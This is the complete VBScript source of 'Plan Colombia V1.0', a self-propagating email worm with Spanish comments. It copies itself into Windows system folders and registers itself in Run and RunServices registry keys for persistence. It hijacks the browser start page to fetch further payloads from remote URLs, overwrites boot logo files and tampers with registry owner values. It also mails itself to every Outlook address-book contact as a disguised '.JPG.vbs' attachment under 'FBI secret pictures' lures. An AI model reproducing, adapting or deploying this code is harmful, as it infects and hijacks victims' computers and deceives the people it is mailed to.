'   ******************Plan Colombia V1.0  ******************** 
On Error Resume Next
dim archivoscript,directoriosystem,directoriowindows
dim polyn,numero,polye,mhm
randomize
numero = Int(Rnd * 3) + 1
polye = ".GIF.vbs"
If numero = 1 Then
  polye = ".BMP.vbs"
 Else
  If numero = 2 Then
    polye = ".JPG.vbs"
  End If
End If
polyn="\"&lcase(COLOMBIA(Int(Rnd * 5) + 4))&polye
Set archivoscript = CreateObject("Scripting.FileSystemObject")
ppal()
If Day(Now) = 17 Then
  MsgBox "Dedicated to my best brother=>Christiam Julian(C.J.G.S.)" & Chr(13) & "Att.  " & COLOMBIA(5) & "   (M.H.M. TEAM)", vbOKOnly, "Plan Colombia v1.0"  
  set mhm=CreateObject("WScript.Shell")
  mhm.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Version", "LINUX ALPHA 64"
  mhm.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Christiam Julian(CJGS)"
  mhm.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "MHM"
  set mhm=Nothing
End If


sub ppal()
On Error Resume Next
dim windowsscripts,halomama
set windowsscripts=CreateObject("WScript.Shell")
halomama=windowsscripts.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (halomama>=1) then'si el usuario le tiene tiempo maximo ala ejecucion de scripts
 windowsscripts.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if

Set directoriosystem = archivoscript.GetSpecialFolder(1)
Set directoriowindows = archivoscript.GetSpecialFolder(0)
Set archivosppals = archivoscript.GetFile(WScript.ScriptFullName)
archivosppals.Copy(directoriosystem&"\LINUX32.vbs")
archivosppals.Copy(directoriowindows&"\LINUXFOREVER.vbs")
archivosppals.Copy(directoriosystem&polyn)
registrodearranque()
reproducirporcorreo()
end sub



sub registrodearranque()
On Error Resume Next
Dim num,directoriodescargas,res,editarregistro
set editarregistro=CreateObject("WScript.Shell")

editarregistro.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\LINUXFOREVER",directoriowindows&"\LINUXFOREVER.vbs"
directoriodescargas=""
editarregistro.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\LINUX32",directoriosystem&"\LINUX32.vbs"
directoriodescargas=editarregistro.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (directoriodescargas="") then
  directoriodescargas="c:\"
end if '   acepta nombres largos..?
if (archivoscript.FileExists(directoriosystem&"\WinFAT32.exe")) then
  Randomize
  Randomize
  num = Int((4 * Rnd) + 1)  '  fatal => send virii
  if num = 2 then 
    editarregistro.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/macromedia32.zip"
   else '  oh,, a picture.. nice :)  
    if num = 3 then
        editarregistro.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux321.zip"       
      else'  oh,, other picture  =:()
       if num = 4 then
         editarregistro.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux322.zip"
       end if 
    end if  
 end if
end if
if (archivoscript.FileExists(directoriodescargas&"\MACROMEDIA32.zip")) then
  archivoscript.CopyFile directoriodescargas & "\MACROMEDIA32.zip",directoriowindows & "\important_note.txt"
  editarregistro.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\plan colombia",directoriowindows&"\important_note.txt"
  editarregistro.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
 else
  if (archivoscript.FileExists(directoriodescargas&"\linux321.zip")) then
     Kill (directoriowindows & "\logos.sys")
     archivoscript.CopyFile directoriodescargas & "\linux321.zip",directoriowindows & "\logos.sys"
     editarregistro.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
    else
      if (archivoscript.FileExists(directoriodescargas&"\linux322.zip")) then
        Kill (directoriowindows & "\logow.sys")
        archivoscript.CopyFile directoriodescargas & "\linux322.zip",directoriowindows & "\logow.sys"
        editarregistro.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
      end if   
  end if
end if
end sub

Function COLOMBIA(n)
Dim i, vector, texto, pos
on error resume next
vector = Array("A", "E", "I", "O", "U")
texto = ""
For i = 1 To n
  Randomize
  texto = texto&Chr(Int((Rnd * 25) + 65))
  i = i + 1
  If i > n Then
   exit for
  end if
  texto = texto&vector(Int((Rnd * 4) + 1))
Next
COLOMBIA = texto
End Function

sub reproducirporcorreo()
On Error Resume Next
dim n,a,listasdecontrol,ctrentries,correoad,b,editarregistro,verregistro,agregarregistro,textosub,textobod,interfazcorreo
set editarregistro=CreateObject("WScript.Shell")
set correosalida=WScript.CreateObject("Outlook.Application")
set interfazcorreo=correosalida.GetNameSpace("MAPI")
Randomize
numero = Int(Rnd * 3) + 1
textosub = ""
If numero = 1 Then
  textosub = "US PRESIDENT AND FBI SECRET PICTURES =PLEASE VISIT => ( http://WWW.2600.COM )<="
 Else
  If numero = 2 Then
    textosub = COLOMBIA(6)
  End If
End If
Randomize
numero = Int(Rnd * 3) + 1
textobod = ""
If numero = 1 Then
  textobod = "VERY JOKE..! SEE PRESIDENT AND FBI TOP SECRET PICTURES.."
 Else
  If numero = 2 Then
    textobod = COLOMBIA(10)
  End If
End If
for listasdecontrol=1 to interfazcorreo.AddressLists.Count
 set a=interfazcorreo.AddressLists(listasdecontrol)
 n=1
 verregistro=editarregistro.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
 if (verregistro="") then
 verregistro=1
 end if
 if (int(a.AddressEntries.Count)>int(verregistro)) then 
  for ctrentries=1 to a.AddressEntries.Count
   correoad=a.AddressEntries(n)
   agregarregistro=""
   agregarregistro=editarregistro.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad)
   if (agregarregistro="") then
     set correo=correosalida.CreateItem(0)
     correo.Recipients.Add(correoad)     
     correo.Subject = textosub
     correo.Body = vbcrlf&textobod
     correo.Attachments.Add(directoriosystem&polyn)
     correo.Send
     editarregistro.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad,1,"REG_DWORD"
   end if
     n=n+1
  next
  editarregistro.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
 else
   editarregistro.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set correosalida=Nothing
Set interfazcorreo=Nothing
set editarregistro=Nothing
end sub



